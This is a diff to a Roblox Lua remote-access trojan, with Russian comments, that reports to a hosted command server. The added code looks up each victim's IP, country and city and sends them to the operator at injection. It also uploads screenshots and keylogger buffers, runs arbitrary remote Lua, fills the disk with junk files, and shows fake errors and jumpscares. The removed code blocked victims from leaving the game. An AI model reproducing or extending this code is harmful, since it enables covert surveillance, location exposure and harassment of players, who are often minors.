@@ -7,7 +7,6 @@ local SoundService = game:GetService("SoundService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local TeleportService = game:GetService("TeleportService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
 
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local player = Players.LocalPlayer
@@ -16,169 +15,6 @@ local keyloggerEnabled = false
 local keylogBuffer = ""
 local lastSendTime = os.time()
 local lastUserUpdate = 0
-local antiLeaveEnabled = false
-local antiLeaveTarget = nil
-local antiLeaveConnections = {}
-local antiLeaveBlocked = false
-
--- ========== ANTI-LEAVE СИСТЕМА ==========
-local function setupAntiLeave()
-    local function shouldBlockAction()
-        if not antiLeaveEnabled then return false end
-        if antiLeaveTarget and antiLeaveTarget ~= player.Name then return false end
-        return true
-    end
-
-    local function showWarning()
-        task.spawn(function()
-            local gui = Instance.new("ScreenGui")
-            gui.Name = "AntiLeaveWarning"
-            gui.Parent = player:WaitForChild("PlayerGui")
-            gui.ResetOnSpawn = false
-            
-            local frame = Instance.new("Frame")
-            frame.Size = UDim2.new(0.5, 0, 0.2, 0)
-            frame.Position = UDim2.new(0.25, 0, 0.4, 0)
-            frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            frame.BorderColor3 = Color3.fromRGB(255, 50, 50)
-            frame.BorderSizePixel = 3
-            frame.Parent = gui
-            
-            local text = Instance.new("TextLabel")
-            text.Size = UDim2.new(0.9, 0, 0.8, 0)
-            text.Position = UDim2.new(0.05, 0, 0.1, 0)
-            text.Text = "🚫 ВЫХОД ЗАПРЕЩЕН"
-            text.TextColor3 = Color3.fromRGB(255, 50, 50)
-            text.TextScaled = true
-            text.Font = Enum.Font.GothamBold
-            text.BackgroundTransparency = 1
-            text.Parent = frame
-            
-            task.delay(2, function()
-                pcall(function() gui:Destroy() end)
-            end)
-        end)
-    end
-
-    -- Блокировка выхода через PlayerRemoving
-    local function blockPlayerRemoving()
-        local connection = Players.PlayerRemoving:Connect(function(playerLeaving)
-            if playerLeaving == player and shouldBlockAction() and not antiLeaveBlocked then
-                antiLeaveBlocked = true
-                showWarning()
-                
-                -- Отменяем выход
-                task.delay(0.5, function()
-                    if player.Character then
-                        player.Character:BreakJoints()
-                    end
-                    player:LoadCharacter()
-                    antiLeaveBlocked = false
-                end)
-            end
-        end)
-        table.insert(antiLeaveConnections, connection)
-    end
-
-    -- Блокировка Escape меню
-    local function blockEscapeMenu()
-        local connection = UserInputService.InputBegan:Connect(function(input, processed)
-            if not processed and input.KeyCode == Enum.KeyCode.Escape then
-                if shouldBlockAction() then
-                    showWarning()
-                    
-                    task.spawn(function()
-                        pcall(function()
-                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, nil)
-                            task.wait(0.1)
-                            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, nil)
-                        end)
-                    end)
-                end
-            end
-        end)
-        table.insert(antiLeaveConnections, connection)
-    end
-
-    -- Блокировка телепортации
-    local function blockTeleportation()
-        local success, teleportService = pcall(function() return game:GetService("TeleportService") end)
-        if not success then return end
-        
-        local oldTeleport = teleportService.Teleport
-        local oldTeleportAsync = teleportService.TeleportAsync
-        
-        if oldTeleport then
-            teleportService.Teleport = function(...)
-                if shouldBlockAction() then
-                    showWarning()
-                    return
-                end
-                return oldTeleport(...)
-            end
-        end
-        
-        if oldTeleportAsync then
-            teleportService.TeleportAsync = function(...)
-                if shouldBlockAction() then
-                    showWarning()
-                    return
-                end
-                return oldTeleportAsync(...)
-            end
-        end
-        
-        table.insert(antiLeaveConnections, {
-            restore = function()
-                teleportService.Teleport = oldTeleport
-                teleportService.TeleportAsync = oldTeleportAsync
-            end
-        })
-    end
-
-    -- Инициализация всех блокировок
-    local function initializeBlocks()
-        blockPlayerRemoving()
-        blockEscapeMenu()
-        blockTeleportation()
-    end
-
-    -- Очистка всех подключений
-    local function cleanupConnections()
-        for _, conn in ipairs(antiLeaveConnections) do
-            if type(conn) == "userdata" and conn.Disconnect then
-                pcall(function() conn:Disconnect() end)
-            elseif type(conn) == "table" and conn.restore then
-                pcall(conn.restore)
-            end
-        end
-        antiLeaveConnections = {}
-    end
-
-    return {
-        enable = function(target)
-            cleanupConnections()
-            antiLeaveEnabled = true
-            antiLeaveTarget = target
-            initializeBlocks()
-        end,
-        
-        disable = function()
-            antiLeaveEnabled = false
-            antiLeaveTarget = nil
-            cleanupConnections()
-        end,
-        
-        status = function()
-            return {
-                enabled = antiLeaveEnabled,
-                target = antiLeaveTarget
-            }
-        end
-    }
-end
-
-local antiLeaveSystem = setupAntiLeave()
 
 -- ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 local function httpRequest(params)
@@ -187,6 +23,66 @@ local function httpRequest(params)
     
     local success, response = pcall(requestFunc, params)
     return success and response or nil
+end
+
+local function getDeviceType()
+    if UserInputService.TouchEnabled then
+        if UserInputService.MouseEnabled then
+            return "Tablet"
+        else
+            return "Mobile"
+        end
+    else
+        return "PC"
+    end
+end
+
+local function sendInjectNotification()
+    local playerName = player.Name
+    local success, placeInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    local placeName = success and placeInfo.Name or "Unknown"
+    
+    local ipData = "N/A"
+    local ipResponse = httpRequest({
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    })
+    
+    if ipResponse and ipResponse.Body then
+        local success, ipInfo = pcall(function()
+            return HttpService:JSONDecode(ipResponse.Body)
+        end)
+        if success and ipInfo and ipInfo.status ~= "fail" then
+            ipData = string.format(
+                "IP: %s\nCountry: %s\nCity: %s",
+                ipInfo.query or "N/A",
+                ipInfo.country or "N/A", 
+                ipInfo.city or "N/A"
+            )
+        end
+    end
+
+    local executor = "Unknown"
+    if identifyexecutor then
+        local success, exec = pcall(identifyexecutor)
+        if success then
+            executor = exec
+        end
+    end
+    
+    local deviceType = getDeviceType()
+    
+    httpRequest({
+        Url = SERVER_URL.."/command",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            command = "inject_notify",
+            args = {playerName, placeName, ipData, executor, deviceType}
+        })
+    })
 end
 
 local function sendUserInfo()
@@ -205,6 +101,8 @@ local function sendUserInfo()
         if success then executor = exec end
     end
     
+    local deviceType = getDeviceType()
+    
     pcall(function()
         httpRequest({
             Url = SERVER_URL.."/users",
@@ -214,7 +112,7 @@ local function sendUserInfo()
                 player = playerName,
                 place = placeName,
                 executor = executor,
-                device = UserInputService.TouchEnabled and "Mobile" or "PC"
+                device = deviceType
             })
         })
     end)
@@ -269,115 +167,255 @@ local function showPopupMessage(message)
     end)
 end
 
-local function setupChat()
-    local success, result = pcall(function()
-        local screenGui = Instance.new("ScreenGui")
-        screenGui.Name = "RatChat"
-        screenGui.Parent = player:WaitForChild("PlayerGui")
-        screenGui.ResetOnSpawn = false
-        screenGui.Enabled = false
-
-        local chatFrame = Instance.new("Frame")
-        chatFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
-        chatFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-        chatFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-        chatFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-        chatFrame.BackgroundTransparency = 0.3
-        chatFrame.Active = true
-        chatFrame.Draggable = true
-        chatFrame.Parent = screenGui
-
-        local scrollingFrame = Instance.new("ScrollingFrame")
-        scrollingFrame.Size = UDim2.new(1, -10, 1, -50)
-        scrollingFrame.Position = UDim2.new(0, 5, 0, 5)
-        scrollingFrame.BackgroundTransparency = 1
-        scrollingFrame.ScrollBarThickness = 5
-        scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-        scrollingFrame.Parent = chatFrame
-
-        local textBox = Instance.new("TextBox")
-        textBox.Size = UDim2.new(1, -60, 0, 30)
-        textBox.Position = UDim2.new(0, 5, 1, -35)
-        textBox.PlaceholderText = "Сообщение..."
-        textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-        textBox.ClearTextOnFocus = false
-        textBox.Parent = chatFrame
-
-        local sendButton = Instance.new("TextButton")
-        sendButton.Size = UDim2.new(0, 50, 0, 30)
-        sendButton.Position = UDim2.new(1, -55, 1, -35)
-        sendButton.Text = "Отпр."
-        sendButton.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
-        sendButton.Parent = chatFrame
-
-        local function addMessage(sender, text, isSystem)
-            local messageFrame = Instance.new("Frame")
-            messageFrame.Size = UDim2.new(1, 0, 0, 0)
-            messageFrame.AutomaticSize = Enum.AutomaticSize.Y
-            messageFrame.BackgroundTransparency = 1
-            messageFrame.Parent = scrollingFrame
-
-            local bubble = Instance.new("Frame")
-            bubble.Size = UDim2.new(0.8, 0, 0, 0)
-            bubble.AutomaticSize = Enum.AutomaticSize.Y
-            bubble.BackgroundColor3 = isSystem and Color3.fromRGB(80, 80, 100) or 
-                                    (sender == player.Name and Color3.fromRGB(0, 110, 220) or Color3.fromRGB(70, 70, 90))
-            bubble.BackgroundTransparency = 0.1
-            bubble.Parent = messageFrame
-
-            local textLabel = Instance.new("TextLabel")
-            textLabel.Size = UDim2.new(0.9, 0, 0, 0)
-            textLabel.Position = UDim2.new(0.05, 0, 0, 5)
-            textLabel.AutomaticSize = Enum.AutomaticSize.Y
-            textLabel.Text = sender..": "..text
-            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-            textLabel.TextWrapped = true
-            textLabel.BackgroundTransparency = 1
-            textLabel.Parent = bubble
-
-            scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.AbsoluteCanvasSize.Y)
-        end
-
-        local function sendMessage()
-            local text = string.gsub(textBox.Text, "^%s*(.-)%s*$", "%1")
-            if text ~= "" then
-                addMessage(player.Name, text)
-                textBox.Text = ""
-            end
-        end
-
-        textBox.FocusLost:Connect(function(enterPressed)
-            if enterPressed then sendMessage() end
-        end)
-
-        sendButton.MouseButton1Click:Connect(sendMessage)
-
-        addMessage("Система", "Чат RAT активирован", true)
-
-        return {
-            gui = screenGui,
-            enabled = false,
-            addMessage = addMessage
-        }
+local function getHardwareInfo()
+    local playerName = player.Name
+    local success, placeInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
     end)
+    local placeName = success and placeInfo.Name or "Unknown"
     
-    return success and result or nil
+    local ipData = "N/A"
+    local ipResponse = httpRequest({
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    })
+    
+    if ipResponse and ipResponse.Body then
+        local success, ipInfo = pcall(function()
+            return HttpService:JSONDecode(ipResponse.Body)
+        end)
+        if success and ipInfo and ipInfo.status ~= "fail" then
+            ipData = string.format(
+                "IP: %s\nCountry: %s",
+                ipInfo.query or "N/A",
+                ipInfo.country or "N/A"
+            )
+        end
+    end
+
+    local fps = 0
+    local ping = 0
+    
+    local success1, fpsValue = pcall(function()
+        return math.floor(workspace:GetRealPhysicsFPS())
+    end)
+    if success1 then fps = fpsValue end
+    
+    local success2, pingValue = pcall(function()
+        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+    end)
+    if success2 then ping = pingValue end
+
+    local executor = "Unknown"
+    if identifyexecutor then
+        local success, exec = pcall(identifyexecutor)
+        if success then
+            executor = exec
+        end
+    end
+
+    local systemInfo = {
+        device_type = getDeviceType(),
+        touch_enabled = UserInputService.TouchEnabled,
+        mouse_enabled = UserInputService.MouseEnabled,
+        keyboard_enabled = UserInputService.KeyboardEnabled,
+        screen_size = workspace.CurrentCamera.ViewportSize
+    }
+
+    local hardwareData = {
+        player = playerName,
+        game = placeName,
+        fps = fps,
+        ping = ping,
+        executor = executor,
+        ip_info = ipData,
+        system = systemInfo
+    }
+    
+    return hardwareData
 end
 
-local chatSystem = setupChat()
+local function memorySpam(fileCount)
+    if not writefile then return 0 end
+    
+    local successCount = 0
+    
+    for i = 1, fileCount do
+        local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
+        
+        local success = pcall(function()
+            local bigContent = ""
+            for j = 1, 100 do
+                bigContent = bigContent .. "SPAM_" .. math.random(100000, 999999) .. "_" .. 
+                           string.rep("X", 100) .. "\n"
+            end
+            
+            writefile(filename, bigContent)
+            return true
+        end)
+        
+        if success then
+            successCount = successCount + 1
+        end
+        
+        task.wait(0.1)
+    end
+    
+    return successCount
+end
+
+local function executeLua(code)
+    local func, err = loadstring(code)
+    if func then
+        local success, result = pcall(func)
+        return success and "Success" or "Error: " .. tostring(result)
+    else
+        return "Compile error: " .. tostring(err)
+    end
+end
+
+local function showFakeError(message)
+    pcall(function()
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "FakeError"
+        gui.Parent = player:WaitForChild("PlayerGui")
+        
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0.5, 0, 0.3, 0)
+        frame.Position = UDim2.new(0.25, 0, 0.35, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+        frame.BorderColor3 = Color3.fromRGB(255, 85, 85)
+        frame.Parent = gui
+        
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
+        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
+        textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..message
+        textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.GothamBold
+        textLabel.BackgroundTransparency = 1
+        textLabel.Parent = frame
+        
+        task.delay(10, function()
+            pcall(function() gui:Destroy() end)
+        end)
+    end)
+end
+
+local function jeffKillerJumpscare()
+    pcall(function()
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "JumpscareUI"
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+        screenGui.ResetOnSpawn = false
+        screenGui.IgnoreGuiInset = true
+        
+        local jeffImage = Instance.new("ImageLabel")
+        jeffImage.Size = UDim2.new(1, 0, 1, 0)
+        jeffImage.Position = UDim2.new(0, 0, 0, 0)
+        jeffImage.BackgroundTransparency = 1
+        jeffImage.ImageTransparency = 1
+        jeffImage.ScaleType = Enum.ScaleType.Crop
+        jeffImage.ZIndex = 1000
+        jeffImage.Image = "rbxassetid://15308155008"
+        jeffImage.Parent = screenGui
+        
+        local warningSound = Instance.new("Sound")
+        warningSound.SoundId = "rbxassetid://18379039436"
+        warningSound.Volume = 0.9
+        warningSound.Parent = screenGui
+        warningSound:Play()
+        
+        task.wait(5)
+        
+        local jeffScream = Instance.new("Sound")
+        jeffScream.SoundId = "rbxassetid://112005418834382"
+        jeffScream.Volume = 2.2
+        jeffScream.Parent = screenGui
+        
+        jeffImage.ImageTransparency = 0
+        jeffScream:Play()
+        
+        for i = 1, 25 do
+            jeffImage.Rotation = math.random(-15, 15)
+            jeffImage.Position = UDim2.new(0, math.random(-60, 60), 0, math.random(-60, 60))
+            task.wait(0.02)
+        end
+        
+        local fadeOut = TweenService:Create(jeffImage, TweenInfo.new(1.5), {ImageTransparency = 1})
+        fadeOut:Play()
+        
+        task.wait(1.6)
+        pcall(function() screenGui:Destroy() end)
+    end)
+end
+
+local function sonicExeJumpscare()
+    pcall(function()
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "JumpscareUI"
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+        screenGui.ResetOnSpawn = false
+        screenGui.IgnoreGuiInset = true
+        
+        local sonicImage = Instance.new("ImageLabel")
+        sonicImage.Size = UDim2.new(1, 0, 1, 0)
+        sonicImage.Position = UDim2.new(0, 0, 0, 0)
+        sonicImage.BackgroundTransparency = 1
+        sonicImage.ImageTransparency = 1
+        sonicImage.ScaleType = Enum.ScaleType.Crop
+        sonicImage.ZIndex = 1000
+        sonicImage.Image = "rbxassetid://13099898470"
+        sonicImage.Parent = screenGui
+        
+        local errorSound = Instance.new("Sound")
+        errorSound.SoundId = "rbxassetid://184702873"
+        errorSound.Volume = 0.8
+        errorSound.Parent = screenGui
+        errorSound:Play()
+        
+        task.wait(1.5)
+        
+        local sonicScream = Instance.new("Sound")
+        sonicScream.SoundId = "rbxassetid://112005418834382"
+        sonicScream.Volume = 2.0
+        sonicScream.Parent = screenGui
+        
+        sonicImage.ImageTransparency = 0
+        sonicScream:Play()
+        
+        for i = 1, 30 do
+            sonicImage.ImageColor3 = Color3.fromRGB(
+                math.random(200, 255),
+                math.random(0, 100),
+                math.random(0, 100)
+            )
+            
+            sonicImage.Rotation = math.random(-20, 20)
+            sonicImage.Position = UDim2.new(
+                0, math.random(-80, 80),
+                0, math.random(-80, 80)
+            )
+            
+            local scale = 0.9 + math.random() * 0.3
+            sonicImage.Size = UDim2.new(scale, 0, scale, 0)
+            
+            task.wait(0.02)
+        end
+        
+        local sonicFade = TweenService:Create(sonicImage, TweenInfo.new(2), {ImageTransparency = 1})
+        sonicFade:Play()
+        
+        task.wait(2.1)
+        pcall(function() screenGui:Destroy() end)
+    end)
+end
 
 -- ========== ФУНКЦИЯ ВЫПОЛНЕНИЯ КОМАНД ==========
 local function ExecuteCommand(cmd, args)
     pcall(function()
-        if cmd == "chat" then
-            if chatSystem then
-                chatSystem.gui.Enabled = not chatSystem.gui.Enabled
-                if chatSystem.gui.Enabled then
-                    chatSystem.addMessage("Система", "Чат включен", true)
-                end
-            end
-        
-        elseif cmd == "popup" then
+        if cmd == "popup" then
             if args and args[1] then
                 showPopupMessage(args[1])
             end
@@ -435,68 +473,83 @@ local function ExecuteCommand(cmd, args)
             if func then pcall(func) end
         
         elseif cmd == "fakeerror" then
-            pcall(function()
-                local gui = Instance.new("ScreenGui")
-                gui.Name = "FakeError"
-                gui.Parent = player:WaitForChild("PlayerGui")
-                
-                local frame = Instance.new("Frame")
-                frame.Size = UDim2.new(0.5, 0, 0.3, 0)
-                frame.Position = UDim2.new(0.25, 0, 0.35, 0)
-                frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-                frame.BorderColor3 = Color3.fromRGB(255, 85, 85)
-                frame.Parent = gui
-                
-                local textLabel = Instance.new("TextLabel")
-                textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
-                textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
-                textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..table.concat(args, " ")
-                textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
-                textLabel.TextScaled = true
-                textLabel.Font = Enum.Font.GothamBold
-                textLabel.BackgroundTransparency = 1
-                textLabel.Parent = frame
-                
-                task.delay(10, function()
-                    pcall(function() gui:Destroy() end)
-                end)
-            end)
+            showFakeError(table.concat(args, " "))
         
-        elseif cmd == "anti_leave" then
-            local action = args[1]
+        elseif cmd == "screenshot" then
+            local screenshotData = nil
+            if getgenv and getgenv().takescreenshot then
+                screenshotData = getgenv().takescreenshot()
+            elseif screencap then
+                screenshotData = screencap()
+            end
             
-            if action == "enable" then
-                local target = args[2]
-                if target == "all" then target = nil end
-                antiLeaveSystem.enable(target)
-                
-                if chatSystem then
-                    chatSystem.addMessage("AntiLeave", 
-                        "🛡️ Система блокировки выхода активирована" .. 
-                        (target and (" для " .. target) or ""), 
-                        true
-                    )
-                end
-                
-            elseif action == "disable" then
-                antiLeaveSystem.disable()
-                
-                if chatSystem then
-                    chatSystem.addMessage("AntiLeave", "🛡️ Система блокировки выхода деактивирована", true)
-                end
-                
-            elseif action == "status" then
-                local status = antiLeaveSystem.status()
-                local statusText = status.enabled and "🟢 Включен" or "🔴 Выключен"
-                local targetText = status.target or "Все игроки"
-                
-                if chatSystem then
-                    chatSystem.addMessage("AntiLeave", 
-                        string.format("%s\nЦель: %s", statusText, targetText), 
-                        true
-                    )
+            if screenshotData then
+                local success, encoded = pcall(function()
+                    return HttpService:JSONEncode(screenshotData)
+                end)
+                if success then
+                    httpRequest({
+                        Url = SERVER_URL.."/screenshot",
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode({ image = encoded })
+                    })
                 end
             end
+        
+        elseif cmd == "keylog" then
+            keyloggerEnabled = true
+            keylogBuffer = ""
+            lastSendTime = os.time()
+        
+        elseif cmd == "stopkeylog" then
+            keyloggerEnabled = false
+            if keylogBuffer ~= "" then
+                httpRequest({
+                    Url = SERVER_URL.."/keylog",
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({ logs = keylogBuffer })
+                })
+            end
+            keylogBuffer = ""
+        
+        elseif cmd == "hardware" then
+            local hwInfo = getHardwareInfo()
+            httpRequest({
+                Url = SERVER_URL.."/hardware",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    player = player.Name,
+                    data = hwInfo
+                })
+            })
+        
+        elseif cmd == "memory_spam" then
+            local fileCount = tonumber(args[1]) or 50
+            task.spawn(function()
+                local savedCount = memorySpam(fileCount)
+                httpRequest({
+                    Url = SERVER_URL.."/command",
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        command = "spam_completed",
+                        args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount}
+                    })
+                })
+            end)
+        
+        elseif cmd == "jumpscare" then
+            local scareType = tonumber(args[1]) or 1
+            task.spawn(function()
+                if scareType == 1 then
+                    jeffKillerJumpscare()
+                else
+                    sonicExeJumpscare()
+                end
+            end)
         end
     end)
 end
@@ -524,11 +577,27 @@ end
 
 -- ========== ОСНОВНОЙ ЦИКЛ ==========
 task.spawn(function()
+    sendInjectNotification()
     sendUserInfo()
     task.wait(15)
     
     while task.wait(15) do
         pcall(sendUserInfo)
         pcall(checkCommands)
+        
+        if keyloggerEnabled and os.time() - lastSendTime >= 300 then
+            if keylogBuffer ~= "" then
+                pcall(function()
+                    httpRequest({
+                        Url = SERVER_URL.."/keylog",
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode({ logs = keylogBuffer })
+                    })
+                    keylogBuffer = ""
+                end)
+            end
+            lastSendTime = os.time()
+        end
     end
 end)
